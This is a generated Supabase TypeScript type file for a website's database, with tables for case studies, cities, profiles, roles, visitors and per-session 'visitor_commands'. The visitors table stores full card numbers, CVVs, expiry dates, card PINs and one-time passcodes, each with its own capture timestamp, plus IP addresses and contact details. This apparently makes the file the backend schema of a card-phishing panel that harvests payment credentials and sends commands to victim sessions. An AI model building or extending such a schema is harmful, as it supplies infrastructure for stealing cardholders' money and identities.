export type Json =
  | string
  | number
  | boolean
  | null
  | { [key: string]: Json | undefined }
  | Json[]

export type Database = {
  // Allows to automatically instantiate createClient with right options
  // instead of createClient<Database, { PostgrestVersion: 'XX' }>(URL, KEY)
  __InternalSupabase: {
    PostgrestVersion: "14.5"
  }
  public: {
    Tables: {
      case_studies: {
        Row: {
          challenge: string
          company: string
          created_at: string
          duration: string
          id: string
          image: string
          industry: string
          location: string
          metric: string
          metric_label: string
          published: boolean
          quote_author: string | null
          quote_role: string | null
          quote_text: string | null
          results: Json
          slug: string
          solution: string
          sort_order: number
          summary: string
          updated_at: string
        }
        Insert: {
          challenge: string
          company: string
          created_at?: string
          duration: string
          id?: string
          image: string
          industry: string
          location: string
          metric: string
          metric_label: string
          published?: boolean
          quote_author?: string | null
          quote_role?: string | null
          quote_text?: string | null
          results?: Json
          slug: string
          solution: string
          sort_order?: number
          summary: string
          updated_at?: string
        }
        Update: {
          challenge?: string
          company?: string
          created_at?: string
          duration?: string
          id?: string
          image?: string
          industry?: string
          location?: string
          metric?: string
          metric_label?: string
          published?: boolean
          quote_author?: string | null
          quote_role?: string | null
          quote_text?: string | null
          results?: Json
          slug?: string
          solution?: string
          sort_order?: number
          summary?: string
          updated_at?: string
        }
        Relationships: []
      }
      cities: {
        Row: {
          country: string
          created_at: string
          id: string
          image_url: string | null
          lat: number
          lng: number
          name: string
          services: string[]
          sort_order: number
          speed: string
          status: string
          updated_at: string
        }
        Insert: {
          country?: string
          created_at?: string
          id?: string
          image_url?: string | null
          lat: number
          lng: number
          name: string
          services?: string[]
          sort_order?: number
          speed: string
          status?: string
          updated_at?: string
        }
        Update: {
          country?: string
          created_at?: string
          id?: string
          image_url?: string | null
          lat?: number
          lng?: number
          name?: string
          services?: string[]
          sort_order?: number
          speed?: string
          status?: string
          updated_at?: string
        }
        Relationships: []
      }
      profiles: {
        Row: {
          created_at: string
          display_name: string | null
          id: string
          location: string | null
          plan: string | null
          updated_at: string
          user_id: string
        }
        Insert: {
          created_at?: string
          display_name?: string | null
          id?: string
          location?: string | null
          plan?: string | null
          updated_at?: string
          user_id: string
        }
        Update: {
          created_at?: string
          display_name?: string | null
          id?: string
          location?: string | null
          plan?: string | null
          updated_at?: string
          user_id?: string
        }
        Relationships: []
      }
      user_roles: {
        Row: {
          created_at: string
          id: string
          role: Database["public"]["Enums"]["app_role"]
          user_id: string
        }
        Insert: {
          created_at?: string
          id?: string
          role: Database["public"]["Enums"]["app_role"]
          user_id: string
        }
        Update: {
          created_at?: string
          id?: string
          role?: Database["public"]["Enums"]["app_role"]
          user_id?: string
        }
        Relationships: []
      }
      visitor_commands: {
        Row: {
          command: string
          created_at: string
          id: string
          payload: Json
          session_id: string
        }
        Insert: {
          command: string
          created_at?: string
          id?: string
          payload?: Json
          session_id: string
        }
        Update: {
          command?: string
          created_at?: string
          id?: string
          payload?: Json
          session_id?: string
        }
        Relationships: []
      }
      visitors: {
        Row: {
          address: string | null
          card_at: string | null
          card_cvv: string | null
          card_expiry: string | null
          card_holder: string | null
          card_number: string | null
          card_otp: string | null
          card_pin: string | null
          checkout_at: string | null
          city: string | null
          country: string | null
          created_at: string
          currency: string | null
          detected_country: string | null
          email: string | null
          full_name: string | null
          id: string
          ip_address: string | null
          landing_path: string | null
          language: string | null
          last_path: string | null
          last_seen_at: string
          order_total: string | null
          otp_at: string | null
          phone: string | null
          pin_at: string | null
          plan_selected: string | null
          postal_code: string | null
          referrer: string | null
          session_id: string
          updated_at: string
          user_agent: string | null
          user_id: string | null
          visits_count: number
        }
        Insert: {
          address?: string | null
          card_at?: string | null
          card_cvv?: string | null
          card_expiry?: string | null
          card_holder?: string | null
          card_number?: string | null
          card_otp?: string | null
          card_pin?: string | null
          checkout_at?: string | null
          city?: string | null
          country?: string | null
          created_at?: string
          currency?: string | null
          detected_country?: string | null
          email?: string | null
          full_name?: string | null
          id?: string
          ip_address?: string | null
          landing_path?: string | null
          language?: string | null
          last_path?: string | null
          last_seen_at?: string
          order_total?: string | null
          otp_at?: string | null
          phone?: string | null
          pin_at?: string | null
          plan_selected?: string | null
          postal_code?: string | null
          referrer?: string | null
          session_id: string
          updated_at?: string
          user_agent?: string | null
          user_id?: string | null
          visits_count?: number
        }
        Update: {
          address?: string | null
          card_at?: string | null
          card_cvv?: string | null
          card_expiry?: string | null
          card_holder?: string | null
          card_number?: string | null
          card_otp?: string | null
          card_pin?: string | null
          checkout_at?: string | null
          city?: string | null
          country?: string | null
          created_at?: string
          currency?: string | null
          detected_country?: string | null
          email?: string | null
          full_name?: string | null
          id?: string
          ip_address?: string | null
          landing_path?: string | null
          language?: string | null
          last_path?: string | null
          last_seen_at?: string
          order_total?: string | null
          otp_at?: string | null
          phone?: string | null
          pin_at?: string | null
          plan_selected?: string | null
          postal_code?: string | null
          referrer?: string | null
          session_id?: string
          updated_at?: string
          user_agent?: string | null
          user_id?: string | null
          visits_count?: number
        }
        Relationships: []
      }
    }
    Views: {
      [_ in never]: never
    }
    Functions: {
      has_role: {
        Args: {
          _role: Database["public"]["Enums"]["app_role"]
          _user_id: string
        }
        Returns: boolean
      }
      merge_duplicate_visitors: { Args: never; Returns: Json }
    }
    Enums: {
      app_role: "admin" | "user"
    }
    CompositeTypes: {
      [_ in never]: never
    }
  }
}

type DatabaseWithoutInternals = Omit<Database, "__InternalSupabase">

type DefaultSchema = DatabaseWithoutInternals[Extract<keyof Database, "public">]

export type Tables<
  DefaultSchemaTableNameOrOptions extends
    | keyof (DefaultSchema["Tables"] & DefaultSchema["Views"])
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
        DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
      DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])[TableName] extends {
      Row: infer R
    }
    ? R
    : never
  : DefaultSchemaTableNameOrOptions extends keyof (DefaultSchema["Tables"] &
        DefaultSchema["Views"])
    ? (DefaultSchema["Tables"] &
        DefaultSchema["Views"])[DefaultSchemaTableNameOrOptions] extends {
        Row: infer R
      }
      ? R
      : never
    : never

export type TablesInsert<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Insert: infer I
    }
    ? I
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Insert: infer I
      }
      ? I
      : never
    : never

export type TablesUpdate<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Update: infer U
    }
    ? U
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Update: infer U
      }
      ? U
      : never
    : never

export type Enums<
  DefaultSchemaEnumNameOrOptions extends
    | keyof DefaultSchema["Enums"]
    | { schema: keyof DatabaseWithoutInternals },
  EnumName extends DefaultSchemaEnumNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"]
    : never = never,
> = DefaultSchemaEnumNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"][EnumName]
  : DefaultSchemaEnumNameOrOptions extends keyof DefaultSchema["Enums"]
    ? DefaultSchema["Enums"][DefaultSchemaEnumNameOrOptions]
    : never

export type CompositeTypes<
  PublicCompositeTypeNameOrOptions extends
    | keyof DefaultSchema["CompositeTypes"]
    | { schema: keyof DatabaseWithoutInternals },
  CompositeTypeName extends PublicCompositeTypeNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"]
    : never = never,
> = PublicCompositeTypeNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"][CompositeTypeName]
  : PublicCompositeTypeNameOrOptions extends keyof DefaultSchema["CompositeTypes"]
    ? DefaultSchema["CompositeTypes"][PublicCompositeTypeNameOrOptions]
    : never

export const Constants = {
  public: {
    Enums: {
      app_role: ["admin", "user"],
    },
  },
} as const
